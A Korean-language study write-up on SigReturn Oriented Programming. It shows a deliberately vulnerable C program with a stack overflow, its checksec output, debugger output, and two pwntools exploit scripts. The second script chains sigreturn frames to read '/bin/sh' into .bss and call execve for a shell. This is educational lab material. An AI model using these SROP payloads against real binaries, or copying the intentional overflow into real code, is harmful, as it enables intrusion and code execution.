# SigReturn Oriented Programming
## 소스코드
// Name: srop.c
// Compile: gcc -o srop srop.c -fno-stack-protector -no-pie

#include <unistd.h>

int gadget() {
  asm("pop %rax;"
      "syscall;"
      "ret" );
}

int main()
{
  char buf[16];
  read(0, buf ,1024);
}
## 보호기법
$ pwn checksec srop
[*] "srop"
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

# 코드 분석

예제에서는 16바이트 크기의 버퍼에 1024바이트를 입력할 수 있으므로 스택 버퍼 오버플로우가 발생

주어진 gadget함수의 코드를 이용해서 sigreturn 시스템 콜을 호출하여 레지스터를 조작


## 익스 
1. sigreturn 호출
SROP를 하기 위해서는 sigreturn 시스템 콜을 호출 할 수 있어야 함 예제에서는 임의 시스템 콜을 호출할 수 있도록 gadget 함수를 제공함 해당함수 내부의 코드 가젯의 주소를 알아내고 시스템 콜 번호와 syscall 명령어를 통해 sigreturn을 호출함

2. execver 호출
sigreturn 은 스택 영역의 값을 레지스터로 복사함 따라서 1024바이트를 입력 할때 sigcontext 구조체를 생각하고 execve 시스템 콜을 호출하기 위한 인자를 설정해야 함

### sigreturn 호출
sigreturn syscall number : 15
오버플로우로 RIP를 gadget 함수로 옮기고 RAX에 15를 넣으면 됨
#!/usr/bin/env python3
# Name: srop.py
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'x86_64'
p = process('./srop')
elf = ELF('./srop')
gadget = next(elf.search(asm('pop rax; syscall')))
print('gadget..', hex(gadget))
payload = b'A'*16
payload += b'B'*8
payload += p64(gadget)
payload += p64(15) # sigreturn
payload += b'\x00'*40 # dummy
payload += p64(0x4141414141414141)*20
print('press enter to continue')
pause()
p.sendline(payload)
p.interactive()

해당 익스 사용시 레지스터를 0x41로 덮을수 있음
~ gdb -p $(pgrep -f srop)
pwndbg> c
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0x4141414141414141 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
*RAX  0x0
*RBX  0x4141414141414141 ('AAAAAAAA')
*RCX  0x4141414141414141 ('AAAAAAAA')
*RDX  0x4141414141414141 ('AAAAAAAA')
*RDI  0x4141414141414141 ('AAAAAAAA')
*RSI  0x4141414141414141 ('AAAAAAAA')
*R8   0x4141414141414141 ('AAAAAAAA')
*R9   0x4141414141414141 ('AAAAAAAA')
*R10  0x4141414141414141 ('AAAAAAAA')
*R11  0x4141414141414141 ('AAAAAAAA')
*R12  0x4141414141414141 ('AAAAAAAA')
*R13  0x4141414141414141 ('AAAAAAAA')
*R14  0x4141414141414141 ('AAAAAAAA')
*R15  0x4141414141414141 ('AAAAAAAA')
*RBP  0x4141414141414141 ('AAAAAAAA')
*RSP  0x4141414141414141 ('AAAAAAAA')
*RIP  0x4141414141414141 ('AAAAAAAA')
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
Invalid address 0x4141414141414141
───────────────────────────────────[ STACK ]────────────────────────────────────
<Could not read memory at 0x4141414141414141>
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0 0x4141414141414141
────────────────────────────────────────────────────────────────────────────────
pwndbg>

위 python코드의 17번 라인의 pause()에서 스크ㅡ립트가 멈추면 다른 셸으르 키고 디버거를 attach하여 디버깅할수 있음 attach한 후 c 명령어로 실행하면 스크립트  상에서도 엔터키를 눌러 페이로드를 전송하면 위와 같은 결과를 얻을 수 있음

### execve 호출
execve 시스템 콜을 호출하기에 앞서 sigcontext 구조체에 정의된 레지스터의 순서를 고려하여 스택에 값을 써넣어야 함 매번 구조체를 확인하면서 스택에 값을 삽입하는 것은 힘들지만 pwntools에서 sigreturnframe 클래스를 제공해서 쉬움

>>> from pwn import *
>>> context.clear(arch='amd64')
>>> frame = SigreturnFrame()
>>> frame.rdi = 0x41414141
>>> frame.rax = 59
>>> frame.rsi = 12341234
>>> print(frame)
b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AAAA\x00\x00\x00\x00\xf2O\xbc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x003\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

라이브러리 주소를 알아내지 않고 바이너리 영역에 /bin/sh 문자열을 작성한 후 execve 시스템 콜 호출시에 해당 문자열의 주소를 인자로 전달하면 셸을 획득할 수 잉ㅆ음 예제에서는 입력을 한번 밖에 할 수 없으므로 read함수를 호출하여 바이너리 주소에 /bin/shs 문자열을 작성함

#!/usr/bin/env python3
# Name: srop.py
from pwn import *
context.arch = 'x86_64'
p = process('./srop')
elf = ELF('./srop')
gadget = next(elf.search(asm('pop rax; syscall')))
syscall = next(elf.search(asm('syscall')))
read_got = elf.got['read']
binsh = '/bin/sh\x00'
bss = elf.bss()
frame = SigreturnFrame()
# read(0, bss, 0x1000)
frame.rax = 0        # SYS_read
frame.rsi = bss
frame.rdx = 0x1000
frame.rdi = 0
frame.rip = syscall
frame.rsp = bss
payload = b'A'*16
payload += b'B'*8
payload += p64(gadget)
payload += p64(15) # sigreturn
payload += bytes(frame)
p.sendline(payload)
# execve('/bin/sh', 0, 0)
frame2 = SigreturnFrame()
frame2.rip = syscall
frame2.rax = 0x3b # execve
frame2.rsp = bss + 0x500
frame2.rdi = bss + 0x108
rop = p64(gadget)
rop += p64(15)
rop += bytes(frame2)
rop += b'/bin/sh\x00'
p.sendline(rop)
p.interactive()

SROP를 통해 read시스템 콜을 호출해 bss 영역에 0x1000바이트만큼 입력 받고 RSP레지스터를 입력한 bss 영역의 주소로 바꾸고 다시 한번 리턴 주소를 조작할 수 있게 하고 다음 SROP코드를 확인해보면 execve시스템 콜읋 호출하고 뒤에서 입력한 /bin/sh 문자열의 주소를 인자로 전달하는 것을 확인할 수 있음
